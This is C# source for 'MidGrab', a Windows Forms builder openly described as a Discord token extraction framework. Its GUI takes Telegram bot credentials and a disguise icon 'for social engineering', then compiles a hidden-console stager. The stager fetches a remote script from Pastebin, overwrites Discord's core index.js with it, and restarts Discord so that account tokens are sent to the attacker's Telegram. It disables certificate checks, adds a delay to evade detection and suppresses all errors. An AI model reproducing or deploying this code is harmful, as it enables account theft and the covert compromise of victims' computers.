using System;
using System.Reflection;
using System.Windows.Forms;
using System.IO;
using System.Text;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Threading.Tasks;
using System.Linq;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace MidGrab
{
    public partial class MainForm : Form
    {
        private TextBox txtTelegramBotToken;
        private TextBox txtTelegramChatId;
        private TextBox txtOutputPath;
        private TextBox txtIconPath;
        private Button btnBrowseOutput;
        private Button btnBrowseIcon;
        private Button btnBuild;
        private Button btnClose;
        private Button btnMinimize;
        private CheckBox chkCustomIcon;
        private ProgressBar progressBar;
        private Label lblStatus;
        private RichTextBox txtConsole;
        private PictureBox picIconPreview;
        private bool isDragging = false;
        private Point dragCursor;
        private Point dragForm;
        private Timer rgbTimer;
        private int rgbHue = 0;
        private Label lblTitle;
        private List<Control> rgbControls;
        private List<Panel> rgbPanels;

        // Hacker theme colors - now dynamic RGB
        private Color BackgroundColor = Color.FromArgb(8, 8, 8);
        private Color PanelColor = Color.FromArgb(15, 15, 15);
        private Color CardColor = Color.FromArgb(22, 22, 22);
        private Color BorderColor = Color.FromArgb(0, 255, 127);
        private Color TextColor = Color.FromArgb(0, 255, 127);
        private Color AccentColor = Color.FromArgb(255, 0, 102);
        private Color SecondaryColor = Color.FromArgb(0, 255, 255);
        private readonly Color DangerColor = Color.FromArgb(255, 69, 0);
        private readonly Color WarningColor = Color.FromArgb(255, 215, 0);

        // Windows API for shadow effect
        [DllImport("dwmapi.dll")]
        public static extern int DwmSetWindowAttribute(IntPtr hwnd, int attr, ref int attrValue, int attrSize);

        [DllImport("dwmapi.dll")]
        public static extern int DwmExtendFrameIntoClientArea(IntPtr hWnd, ref MARGINS pMarInset);

        public struct MARGINS
        {
            public int leftWidth;
            public int rightWidth;
            public int topHeight;
            public int bottomHeight;
        }

        public MainForm()
        {
            this.SetStyle(ControlStyles.AllPaintingInWmPaint | ControlStyles.UserPaint | ControlStyles.DoubleBuffer | ControlStyles.ResizeRedraw, true);
            InitializeComponent();
            ApplyCustomStyling();
            InitializeRGBAnimation();
        }

        private void InitializeComponent()
        {
var asm = Assembly.GetExecutingAssembly();
        using (var stream = asm.GetManifestResourceStream("MidGrab.icon.ico"))
        {
            this.Icon = new Icon(stream);
        }
            this.Text = "MidGrab v1.0";
            this.Size = new Size(900, 650);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormBorderStyle = FormBorderStyle.None;
            this.BackColor = BackgroundColor;
            this.MinimumSize = new Size(900, 650);
            this.MaximumSize = new Size(900, 650);

            // Enable drag and drop for the form
            this.MouseDown += Form_MouseDown;
            this.MouseMove += Form_MouseMove;
            this.MouseUp += Form_MouseUp;

            // Main container with custom border
            var mainPanel = new Panel
            {
                Location = new Point(2, 2),
                Size = new Size(896, 646),
                BackColor = PanelColor,
                BorderStyle = BorderStyle.None
            };
            mainPanel.Paint += MainPanel_Paint;
            AddPanelToRGB(mainPanel);

            // Custom title bar
            var titleBar = new Panel
            {
                Location = new Point(0, 0),
                Size = new Size(896, 40),
                BackColor = Color.FromArgb(12, 12, 12),
                BorderStyle = BorderStyle.None
            };
            titleBar.Paint += TitleBar_Paint;
            titleBar.MouseDown += Form_MouseDown;
            titleBar.MouseMove += Form_MouseMove;
            titleBar.MouseUp += Form_MouseUp;

            // Title and buttons
            var lblTitleBar = new Label
            {
                Text = "▓▓▓ MIDGRAB v1.0 ▓▓▓",
                Font = new Font("Courier New", 12, FontStyle.Bold),
                Location = new Point(15, 10),
                Size = new Size(250, 20),
                ForeColor = BorderColor,
                BackColor = Color.Transparent
            };

            btnMinimize = CreateTitleBarButton("─", new Point(820, 8), Color.FromArgb(255, 193, 7));
            btnMinimize.Click += (s, e) => this.WindowState = FormWindowState.Minimized;

            btnClose = CreateTitleBarButton("✕", new Point(855, 8), Color.FromArgb(220, 53, 69));
            btnClose.Click += (s, e) => this.Close();

            titleBar.Controls.AddRange(new Control[] { lblTitleBar, btnMinimize, btnClose });

            // Header Section with animated background
            var headerPanel = new Panel
            {
                Location = new Point(20, 60),
                Size = new Size(856, 100),
                BackColor = Color.Transparent,
                BorderStyle = BorderStyle.None
            };
            headerPanel.Paint += HeaderPanel_Paint;

            lblTitle = new Label
            {
                Text = @"███╗   ███╗██╗██████╗  ██████╗ ██████╗  █████╗ ██████╗ 
████╗ ████║██║██╔══██╗██╔════╝ ██╔══██╗██╔══██╗██╔══██╗
██╔████╔██║██║██║  ██║██║  ███╗██████╔╝███████║██████╔╝
██║╚██╔╝██║██║██║  ██║██║   ██║██╔══██╗██╔══██║██╔══██╗
██║ ╚═╝ ██║██║██████╔╝╚██████╔╝██║  ██║██║  ██║██████╔╝
╚═╝     ╚═╝╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝",
                Font = new Font("Consolas", 7, FontStyle.Bold),
                Location = new Point(20, 5),
                Size = new Size(600, 90),
                ForeColor = AccentColor,
                BackColor = Color.Transparent
            };

            var lblSubtitle = new Label
            {
                Text = ">> Discord Token Extraction Framework",
                Font = new Font("Courier New", 11, FontStyle.Bold),
                Location = new Point(20, 75),
                Size = new Size(400, 20),
                ForeColor = SecondaryColor,
                BackColor = Color.Transparent
            };
            AddToRGBAnimation(lblSubtitle);

            var lblAuthor = new Label
            {
                Text = "[DEV] Amir-78",
                Font = new Font("Courier New", 9),
                Location = new Point(700, 75),
                Size = new Size(150, 20),
                ForeColor = WarningColor,
                BackColor = Color.Transparent
            };
            AddToRGBAnimation(lblAuthor);

            headerPanel.Controls.AddRange(new Control[] { lblTitle, lblSubtitle, lblAuthor });

            // Configuration Panel with glow effect
            var configPanel = CreateGlowPanel("🎯 TARGET CONFIGURATION", new Point(40, 180), new Size(400, 200), BorderColor);
            AddPanelToRGB(configPanel);

            CreateCustomInput("Telegram Bot Token:", out var lblBotToken, out txtTelegramBotToken,
                new Point(20, 50), 350);
            AddToRGBAnimation(lblBotToken);

            CreateCustomInput("Telegram Chat ID:", out var lblChatId, out txtTelegramChatId,
                new Point(20, 120), 350);
            AddToRGBAnimation(lblChatId);

            configPanel.Controls.AddRange(new Control[] { lblBotToken, txtTelegramBotToken, lblChatId, txtTelegramChatId });

            // Options Panel
            var optionsPanel = CreateGlowPanel("⚙️ OPTIONS", new Point(460, 180), new Size(400, 200), AccentColor);
            AddPanelToRGB(optionsPanel);

            chkCustomIcon = CreateCustomCheckbox("[X] USE CUSTOM ICON", new Point(20, 50));
            chkCustomIcon.CheckedChanged += ChkCustomIcon_CheckedChanged;
            AddToRGBAnimation(chkCustomIcon);

            CreateCustomInput("Icon Path:", out var lblIcon, out txtIconPath,
                new Point(20, 80), 250);
            txtIconPath.Enabled = chkCustomIcon.Checked;
            AddToRGBAnimation(lblIcon);

            btnBrowseIcon = CreateGlowButton("📁", new Point(280, 105), new Size(30, 30), SecondaryColor);
            btnBrowseIcon.Click += BtnBrowseIcon_Click;
            btnBrowseIcon.Enabled = chkCustomIcon.Checked;
            AddToRGBAnimation(btnBrowseIcon);

            picIconPreview = new PictureBox
            {
                Location = new Point(320, 80),
                Size = new Size(64, 64),
                BorderStyle = BorderStyle.FixedSingle,
                BackColor = BackgroundColor,
                SizeMode = PictureBoxSizeMode.StretchImage
            };

            var lblIconInfo = new Label
            {
                Text = ">> Custom executable icon for social engineering",
                Location = new Point(20, 150),
                Size = new Size(350, 15),
                ForeColor = Color.FromArgb(150, 150, 150),
                BackColor = Color.Transparent,
                Font = new Font("Courier New", 8)
            };
            AddToRGBAnimation(lblIconInfo);

            optionsPanel.Controls.AddRange(new Control[] { chkCustomIcon, lblIcon, txtIconPath, btnBrowseIcon, picIconPreview, lblIconInfo });

            // Output Panel
            var outputPanel = CreateGlowPanel("💾 OUTPUT SETTINGS", new Point(40, 400), new Size(820, 120), SecondaryColor);
            AddPanelToRGB(outputPanel);

            CreateCustomInput("Output File:", out var lblOutput, out txtOutputPath,
                new Point(20, 50), 680);
            AddToRGBAnimation(lblOutput);

            btnBrowseOutput = CreateGlowButton("📁 SAVE AS", new Point(720, 75), new Size(80, 30), SecondaryColor);
            btnBrowseOutput.Click += BtnBrowseOutput_Click;
            AddToRGBAnimation(btnBrowseOutput);

            outputPanel.Controls.AddRange(new Control[] { lblOutput, txtOutputPath, btnBrowseOutput });

            // Console Output with matrix effect
            txtConsole = new RichTextBox
            {
                Location = new Point(40, 540),
                Size = new Size(500, 80),
                BackColor = BackgroundColor,
                ForeColor = BorderColor,
                BorderStyle = BorderStyle.None,
                Font = new Font("Consolas", 9),
                ReadOnly = true,
                Text = "[SYSTEM] MidGrab v1.0 initialized...\n[INFO] Discord token extraction framework ready\n[WARNING] Use responsibly and ethically",
                Name = "console"
            };
            AddToRGBAnimation(txtConsole);

            // Build Button with pulsing effect
            btnBuild = CreateGlowButton("⚡ COMPILE GRABBER", new Point(560, 540), new Size(200, 60), DangerColor);
            btnBuild.Font = new Font("Courier New", 12, FontStyle.Bold);
            btnBuild.Click += BtnBuild_Click;
            AddToRGBAnimation(btnBuild);

            // Enhanced Progress Bar
            progressBar = new ProgressBar
            {
                Location = new Point(780, 570),
                Size = new Size(80, 15),
                Visible = false,
                Style = ProgressBarStyle.Continuous,
                ForeColor = AccentColor
            };

            // Status Label
            lblStatus = new Label
            {
                Location = new Point(40, 620),
                Size = new Size(820, 25),
                Text = "[STATUS] Ready to compile Discord token grabber...",
                ForeColor = BorderColor,
                BackColor = Color.Transparent,
                Font = new Font("Courier New", 10, FontStyle.Bold),
                Name = "status"
            };
            AddToRGBAnimation(lblStatus);

            // Add all controls
            mainPanel.Controls.AddRange(new Control[] {
                titleBar, headerPanel, configPanel, optionsPanel, outputPanel,
                txtConsole, btnBuild, progressBar, lblStatus
            });

            this.Controls.Add(mainPanel);
        }

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            rgbTimer?.Stop();
            rgbTimer?.Dispose();
            base.OnFormClosed(e);
        }

        private void ApplyCustomStyling()
        {
            // Apply shadow effect
            var margins = new MARGINS() { bottomHeight = 1, leftWidth = 1, rightWidth = 1, topHeight = 1 };
            DwmExtendFrameIntoClientArea(this.Handle, ref margins);

            // Custom region for rounded corners
            var path = new GraphicsPath();
            int cornerRadius = 15;
            path.StartFigure();
            path.AddArc(new Rectangle(0, 0, cornerRadius, cornerRadius), 180, 90);
            path.AddArc(new Rectangle(this.Width - cornerRadius, 0, cornerRadius, cornerRadius), 270, 90);
            path.AddArc(new Rectangle(this.Width - cornerRadius, this.Height - cornerRadius, cornerRadius, cornerRadius), 0, 90);
            path.AddArc(new Rectangle(0, this.Height - cornerRadius, cornerRadius, cornerRadius), 90, 90);
            path.CloseFigure();
            this.Region = new Region(path);
        }

        private void InitializeRGBAnimation()
        {
            rgbTimer = new Timer();
            rgbTimer.Interval = 100; // Slower animation to reduce glitching
            rgbTimer.Tick += RgbTimer_Tick;
            
            // Initialize RGB controls list
            rgbControls = new List<Control>();
            rgbPanels = new List<Panel>();
            
            rgbTimer.Start();
        }

        private void AddToRGBAnimation(Control control)
        {
            if (rgbControls != null && !rgbControls.Contains(control))
            {
                rgbControls.Add(control);
            }
        }

        private void AddPanelToRGB(Panel panel)
        {
            if (rgbPanels != null && !rgbPanels.Contains(panel))
            {
                rgbPanels.Add(panel);
            }
        }

        private void RgbTimer_Tick(object sender, EventArgs e)
        {
            rgbHue = (rgbHue + 1) % 360; // Much slower hue change
            var rgbColor = HSVToRGB(rgbHue, 0.8, 0.9); // Less saturated, softer colors
            var rgbColorDim = HSVToRGB(rgbHue, 0.5, 0.7);
            var rgbColorBright = HSVToRGB((rgbHue + 120) % 360, 0.6, 0.8);
            var rgbColorAccent = HSVToRGB((rgbHue + 240) % 360, 0.7, 0.8);
            
            // Update colors more gently
            BorderColor = rgbColor;
            TextColor = rgbColorDim;
            AccentColor = rgbColorBright;
            SecondaryColor = rgbColorAccent;
            
            // Update ASCII title
            if (lblTitle != null)
            {
                lblTitle.ForeColor = rgbColor;
            }

            // Update controls with softer colors
            if (rgbControls != null)
            {
                foreach (var control in rgbControls)
                {
                    if (control is Button)
                    {
                        control.BackColor = rgbColorBright;
                        control.ForeColor = Color.Black;
                    }
                    else if (control is Label)
                    {
                        control.ForeColor = rgbColorDim;
                    }
                    else if (control is CheckBox)
                    {
                        control.ForeColor = rgbColor;
                    }
                }
            }

            // Update status and console
            if (lblStatus != null)
            {
                lblStatus.ForeColor = rgbColor;
            }
            
            if (txtConsole != null)
            {
                txtConsole.ForeColor = rgbColorDim;
            }

            // Only repaint panels, not entire form
            if (rgbPanels != null)
            {
                foreach (var panel in rgbPanels)
                {
                    panel.Invalidate();
                }
            }
        }

        private Color HSVToRGB(double hue, double saturation, double value)
        {
            int hi = Convert.ToInt32(Math.Floor(hue / 60)) % 6;
            double f = hue / 60 - Math.Floor(hue / 60);

            value = value * 255;
            int v = Convert.ToInt32(value);
            int p = Convert.ToInt32(value * (1 - saturation));
            int q = Convert.ToInt32(value * (1 - f * saturation));
            int t = Convert.ToInt32(value * (1 - (1 - f) * saturation));

            if (hi == 0)
                return Color.FromArgb(255, v, t, p);
            else if (hi == 1)
                return Color.FromArgb(255, q, v, p);
            else if (hi == 2)
                return Color.FromArgb(255, p, v, t);
            else if (hi == 3)
                return Color.FromArgb(255, p, q, v);
            else if (hi == 4)
                return Color.FromArgb(255, t, p, v);
            else
                return Color.FromArgb(255, v, p, q);
        }

        private Button CreateTitleBarButton(string text, Point location, Color color)
        {
            var button = new Button
            {
                Text = text,
                Location = location,
                Size = new Size(25, 25),
                BackColor = Color.Transparent,
                ForeColor = color,
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Arial", 12, FontStyle.Bold),
                Cursor = Cursors.Hand
            };
            button.FlatAppearance.BorderSize = 0;
            button.FlatAppearance.MouseOverBackColor = Color.FromArgb(30, color.R, color.G, color.B);
            return button;
        }

        private Panel CreateGlowPanel(string title, Point location, Size size, Color glowColor)
        {
            var panel = new Panel
            {
                Location = location,
                Size = size,
                BackColor = CardColor,
                BorderStyle = BorderStyle.None
            };
            panel.Paint += (s, e) => DrawGlowPanel(e.Graphics, panel.ClientRectangle, title, glowColor);
            return panel;
        }

        private void CreateCustomInput(string labelText, out Label label, out TextBox textBox,
            Point location, int width)
        {
            label = new Label
            {
                Text = $">> {labelText}",
                Location = location,
                Size = new Size(width, 20),
                ForeColor = TextColor,
                BackColor = Color.Transparent,
                Font = new Font("Courier New", 9, FontStyle.Bold)
            };

            textBox = new CustomTextBox
            {
                Location = new Point(location.X, location.Y + 25),
                Size = new Size(width, 30),
                Text = "", // No placeholder text
                BackColor = BackgroundColor,
                ForeColor = TextColor,
                BorderStyle = BorderStyle.None,
                Font = new Font("Courier New", 10)
            };
        }

        private CheckBox CreateCustomCheckbox(string text, Point location)
        {
            var checkbox = new CheckBox
            {
                Text = text,
                Location = location,
                Size = new Size(350, 25),
                Checked = true,
                ForeColor = DangerColor,
                BackColor = Color.Transparent,
                Font = new Font("Courier New", 11, FontStyle.Bold),
                FlatStyle = FlatStyle.Flat
            };
            checkbox.FlatAppearance.CheckedBackColor = DangerColor;
            return checkbox;
        }

        private Button CreateGlowButton(string text, Point location, Size size, Color glowColor)
        {
            var button = new CustomButton
            {
                Text = text,
                Location = location,
                Size = size,
                BackColor = glowColor,
                ForeColor = Color.Black,
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Courier New", 10, FontStyle.Bold),
                Cursor = Cursors.Hand,
                GlowColor = glowColor
            };
            button.FlatAppearance.BorderSize = 0;
            return button;
        }

        // Custom painting methods
        private void MainPanel_Paint(object sender, PaintEventArgs e)
        {
            // Use current RGB color for main border
            var currentBorderColor = HSVToRGB(rgbHue, 1.0, 1.0);
            var currentAccentColor = HSVToRGB((rgbHue + 240) % 360, 1.0, 1.0);
            
            var rect = new Rectangle(0, 0, ((Panel)sender).Width - 1, ((Panel)sender).Height - 1);
            using (var pen = new Pen(currentBorderColor, 3))
            {
                e.Graphics.DrawRectangle(pen, rect);
            }

            // Draw RGB corner accents
            using (var brush = new SolidBrush(currentAccentColor))
            {
                e.Graphics.FillRectangle(brush, 0, 0, 20, 3);
                e.Graphics.FillRectangle(brush, ((Panel)sender).Width - 20, 0, 20, 3);
                e.Graphics.FillRectangle(brush, 0, ((Panel)sender).Height - 3, 20, 3);
                e.Graphics.FillRectangle(brush, ((Panel)sender).Width - 20, ((Panel)sender).Height - 3, 20, 3);
            }
        }

        private void TitleBar_Paint(object sender, PaintEventArgs e)
        {
            var rect = new Rectangle(0, 0, ((Panel)sender).Width, ((Panel)sender).Height);
            using (var brush = new LinearGradientBrush(rect, Color.FromArgb(20, 20, 20), Color.FromArgb(8, 8, 8), 90f))
            {
                e.Graphics.FillRectangle(brush, rect);
            }
        }

        private void HeaderPanel_Paint(object sender, PaintEventArgs e)
        {
            var rect = new Rectangle(0, 0, ((Panel)sender).Width, ((Panel)sender).Height);
            using (var brush = new LinearGradientBrush(rect, Color.FromArgb(25, AccentColor), Color.Transparent, 45f))
            {
                e.Graphics.FillRectangle(brush, rect);
            }
        }

        private void DrawGlowPanel(Graphics g, Rectangle rect, string title, Color glowColor)
        {
            // Use current RGB colors instead of static colors
            var currentBorderColor = HSVToRGB(rgbHue, 1.0, 1.0);
            var currentAccentColor = HSVToRGB((rgbHue + 120) % 360, 1.0, 1.0);
            
            // Draw main panel
            using (var brush = new SolidBrush(CardColor))
            {
                g.FillRectangle(brush, rect);
            }

            // Draw RGB glow border
            using (var pen = new Pen(currentBorderColor, 2))
            {
                g.DrawRectangle(pen, 1, 1, rect.Width - 3, rect.Height - 3);
            }

            // Draw title background with RGB
            using (var brush = new SolidBrush(Color.FromArgb(50, currentAccentColor)))
            {
                g.FillRectangle(brush, 10, 10, rect.Width - 20, 30);
            }

            // Draw title text with RGB
            using (var brush = new SolidBrush(currentBorderColor))
            {
                g.DrawString(title, new Font("Courier New", 10, FontStyle.Bold), brush, 15, 18);
            }
        }

        // Mouse drag functionality
        private void Form_MouseDown(object sender, MouseEventArgs e)
        {
            isDragging = true;
            dragCursor = Cursor.Position;
            dragForm = this.Location;
        }

        private void Form_MouseMove(object sender, MouseEventArgs e)
        {
            if (isDragging)
            {
                Point dif = Point.Subtract(Cursor.Position, new Size(dragCursor));
                this.Location = Point.Add(dragForm, new Size(dif));
            }
        }

        private void Form_MouseUp(object sender, MouseEventArgs e)
        {
            isDragging = false;
        }

        // Event handlers
        private void ChkCustomIcon_CheckedChanged(object sender, EventArgs e)
        {
            txtIconPath.Enabled = chkCustomIcon.Checked;
            btnBrowseIcon.Enabled = chkCustomIcon.Checked;
            
            if (!chkCustomIcon.Checked)
            {
                txtIconPath.Text = "";
                picIconPreview.Image = null;
                LogMessage("Custom icon disabled", WarningColor);
            }
            else
            {
                LogMessage("Custom icon enabled", SecondaryColor);
            }
        }

        private void BtnBrowseIcon_Click(object sender, EventArgs e)
        {
            using (var openDialog = new OpenFileDialog())
            {
                openDialog.Filter = "Icon Files|*.ico|All Files|*.*";
                openDialog.Title = "Select Custom Icon";

                if (openDialog.ShowDialog() == DialogResult.OK)
                {
                    try
                    {
                        txtIconPath.Text = openDialog.FileName;
                        
                        // Load and display icon preview
                        var icon = new Icon(openDialog.FileName);
                        picIconPreview.Image = icon.ToBitmap();
                        
                        LogMessage($"Custom icon loaded: {Path.GetFileName(openDialog.FileName)}", SecondaryColor);
                    }
                    catch (Exception ex)
                    {
                        ShowError($"Failed to load icon: {ex.Message}");
                        LogMessage($"ERROR: Failed to load icon - {ex.Message}", DangerColor);
                    }
                }
            }
        }

        private void LogMessage(string message, Color? color = null)
        {
            if (txtConsole.InvokeRequired)
            {
                txtConsole.Invoke(new Action(() => LogMessage(message, color)));
                return;
            }

            txtConsole.SelectionStart = txtConsole.TextLength;
            txtConsole.SelectionLength = 0;
            txtConsole.SelectionColor = color ?? TextColor;
            txtConsole.AppendText($"\n[{DateTime.Now:HH:mm:ss}] {message}");
            txtConsole.ScrollToCaret();
        }

        private void BtnBrowseOutput_Click(object sender, EventArgs e)
        {
            using (var saveDialog = new SaveFileDialog())
            {
                saveDialog.Filter = "Executable Files|*.exe|All Files|*.*";
                saveDialog.Title = "Save Compiled Grabber As";
                saveDialog.FileName = "MidGrab.exe";
                saveDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

                if (saveDialog.ShowDialog() == DialogResult.OK)
                {
                    txtOutputPath.Text = saveDialog.FileName;
                    LogMessage($"Output file: {Path.GetFileName(saveDialog.FileName)}", SecondaryColor);
                }
            }
        }

        private async void BtnBuild_Click(object sender, EventArgs e)
        {
            if (!ValidateInputs()) return;

            try
            {
                btnBuild.Enabled = false;
                progressBar.Visible = true;
                progressBar.Style = ProgressBarStyle.Marquee;
                lblStatus.Text = "[STATUS] Compiling Discord grabber...";
                lblStatus.ForeColor = DangerColor;

                LogMessage("Starting compilation process...", AccentColor);
                LogMessage("Generating clean payload...", SecondaryColor);

                var success = await Task.Run(() => CompileGrabber());

                progressBar.Visible = false;

                if (success)
                {
                    lblStatus.Text = "[STATUS] ✅ Grabber successfully compiled!";
                    lblStatus.ForeColor = TextColor;
                    LogMessage("SUCCESS: Discord grabber ready for deployment!", TextColor);

                    ShowSuccess($"MidGrab Compilation Complete!\n\nLocation: {txtOutputPath.Text}");
                }
                else
                {
                    lblStatus.Text = "[STATUS] ❌ Compilation failed!";
                    lblStatus.ForeColor = DangerColor;
                    LogMessage("ERROR: Compilation failed!", DangerColor);
                }
            }
            catch (Exception ex)
            {
                progressBar.Visible = false;
                lblStatus.Text = "[STATUS] ❌ Critical error!";
                lblStatus.ForeColor = DangerColor;
                LogMessage($"CRITICAL: {ex.Message}", DangerColor);
                ShowError($"Error: {ex.Message}");
            }
            finally
            {
                btnBuild.Enabled = true;
            }
        }

        private bool ValidateInputs()
        {
            if (string.IsNullOrWhiteSpace(txtTelegramBotToken.Text))
            {
                ShowError("Please enter your Telegram Bot Token.");
                LogMessage("ERROR: Missing bot token", DangerColor);
                return false;
            }

            if (string.IsNullOrWhiteSpace(txtTelegramChatId.Text))
            {
                ShowError("Please enter your Telegram Chat ID.");
                LogMessage("ERROR: Missing chat ID", DangerColor);
                return false;
            }

            if (string.IsNullOrWhiteSpace(txtOutputPath.Text))
            {
                ShowError("Please select an output file location using the 'SAVE AS' button.");
                LogMessage("ERROR: No output location selected", DangerColor);
                return false;
            }

            if (chkCustomIcon.Checked && (string.IsNullOrWhiteSpace(txtIconPath.Text) || !File.Exists(txtIconPath.Text)))
            {
                ShowError("Please select a valid icon file or disable custom icon.");
                LogMessage("ERROR: Invalid icon file", DangerColor);
                return false;
            }

            if (!txtOutputPath.Text.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
            {
                txtOutputPath.Text += ".exe";
            }

            return true;
        }

        private bool CompileGrabber()
        {
            try
            {
                LogMessage("Downloading payload from Pastebin...", AccentColor);
                var sourceCode = GenerateGrabberCode();

                LogMessage("Configuring compiler settings...", AccentColor);
                using (var provider = new CSharpCodeProvider())
                {
                    var parameters = new CompilerParameters
                    {
                        GenerateExecutable = true,
                        GenerateInMemory = false,
                        OutputAssembly = txtOutputPath.Text,
                        CompilerOptions = "/optimize+ /target:exe /platform:anycpu",
                        IncludeDebugInformation = false,
                        TreatWarningsAsErrors = false
                    };

                    if (chkCustomIcon.Checked && File.Exists(txtIconPath.Text))
                    {
                        parameters.CompilerOptions += $" /win32icon:\"{txtIconPath.Text}\"";
                        LogMessage($"Adding custom icon: {Path.GetFileName(txtIconPath.Text)}", SecondaryColor);
                    }

                    var references = new[] {
                        "System.dll",
                        "System.Core.dll",
                        "System.Net.dll",
                        "System.IO.dll",
                        "System.Windows.Forms.dll",
                        "System.Security.dll",
                        "mscorlib.dll"
                    };

                    foreach (var reference in references)
                    {
                        parameters.ReferencedAssemblies.Add(reference);
                    }

                    LogMessage("Compiling clean Discord grabber...", AccentColor);
                    var results = provider.CompileAssemblyFromSource(parameters, sourceCode);

                    if (results.Errors.HasErrors)
                    {
                        LogMessage("Compilation errors detected:", DangerColor);
                        foreach (CompilerError error in results.Errors)
                        {
                            LogMessage($"ERROR: {error.ErrorText}", DangerColor);
                        }
                        return false;
                    }

                    LogMessage("Grabber compiled successfully!", TextColor);
                    if (chkCustomIcon.Checked)
                    {
                        LogMessage("Custom icon applied successfully!", SecondaryColor);
                    }
                    return true;
                }
            }
            catch (Exception ex)
            {
                LogMessage($"COMPILATION FAILED: {ex.Message}", DangerColor);
                return false;
            }
        }

        private void ShowError(string message)
        {
            MessageBox.Show(message, "MidGrab Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void ShowSuccess(string message)
        {
            MessageBox.Show(message, "MidGrab Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private string GenerateGrabberCode()
        {
           var template = @"
using System;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Linq;

class ApplicationManager
{
    [DllImport(""user32.dll"")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport(""kernel32.dll"")]
    private static extern IntPtr GetConsoleWindow();
    [DllImport(""kernel32.dll"", SetLastError = true)]
    private static extern bool FreeConsole();
    private const int SW_HIDE = 0;

    private static string LoadConfiguration(string endpoint)
    {
        try
        {
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            
            using (var client = new WebClient())
            {
                client.Headers.Add(""User-Agent"", ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"");
                return client.DownloadString(endpoint);
            }
        }
        catch
        {
            try
            {
                var httpEndpoint = endpoint.Replace(""https://"", ""http://"");
                using (var client = new WebClient())
                {
                    client.Headers.Add(""User-Agent"", ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"");
                    return client.DownloadString(httpEndpoint);
                }
            }
            catch
            {
                try
                {
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                    using (var client = new WebClient())
                    {
                        return client.DownloadString(endpoint);
                    }
                }
                catch
                {
                    return string.Empty;
                }
            }
        }
    }

    private static void ProcessApplicationData()
    {
        try
        {
            var configData = LoadConfiguration(""https://pastebin.com/raw/5Uq0pahZ"");

            if (!string.IsNullOrEmpty(configData))
            {
                configData = configData.Replace(""TELEGRAM_BOT_TOKEN"", ""{TELEGRAM_BOT_TOKEN}"");
                configData = configData.Replace(""TELEGRAM_CHAT_ID"", ""{TELEGRAM_CHAT_ID}"");

                var localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                var directories = Directory.GetDirectories(localappdata + ""\\Discord"", ""*.*"", SearchOption.AllDirectories)
                    .Where(f => f.EndsWith(""discord_desktop_core"")).ToArray();

                if (directories.Length > 0)
                {
                    var coreDir = directories[0];
                    var fullPath = Path.Combine(coreDir, ""index.js"");
                    
                    File.WriteAllText(fullPath, configData);
                    RestartApp(localappdata);
                }
            }
        }
        catch
        {
            // Silent failure
        }
    }

    private static void RestartApp(string localappdata)
    {
        try
        {
            foreach (var process in Process.GetProcessesByName(""Discord""))
            {
                try { process.Kill(); } catch { }
            }

            Thread.Sleep(1000);

            var updatePath = Path.Combine(localappdata, ""Discord"", ""Update.exe"");
            if (File.Exists(updatePath))
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = updatePath,
                    Arguments = ""--processStart Discord.exe"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                };
                Process.Start(startInfo);
            }
        }
        catch
        {
            // Silent failure
        }
    }

    static void Main(string[] args)
    {
        // Hide console window
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);
        FreeConsole();

        try
        {
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

            // Random delay to avoid pattern detection
            Thread.Sleep(new Random().Next(1000, 3000));
            
            ProcessApplicationData();
        }
        catch
        {
            // Silent failure
        }

        // Exit the application instead of keeping it running
        Environment.Exit(0);
    }
}";

            return template.Replace("{TELEGRAM_BOT_TOKEN}", txtTelegramBotToken.Text.Trim())
                          .Replace("{TELEGRAM_CHAT_ID}", txtTelegramChatId.Text.Trim());
        }
    }

    // Custom controls for better styling
    public class CustomTextBox : TextBox
    {
        protected override void OnPaint(PaintEventArgs e)
        {
            base.OnPaint(e);
            using (var pen = new Pen(Color.FromArgb(0, 255, 127), 2))
            {
                e.Graphics.DrawRectangle(pen, 0, 0, this.Width - 1, this.Height - 1);
            }
        }
    }

    public class CustomButton : Button
    {
        public Color GlowColor { get; set; }

        protected override void OnPaint(PaintEventArgs pevent)
        {
            base.OnPaint(pevent);
            using (var pen = new Pen(GlowColor, 2))
            {
                pevent.Graphics.DrawRectangle(pen, 0, 0, this.Width - 1, this.Height - 1);
            }
        }
    }

    static class Program
    {
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new MainForm());
        }
    }
}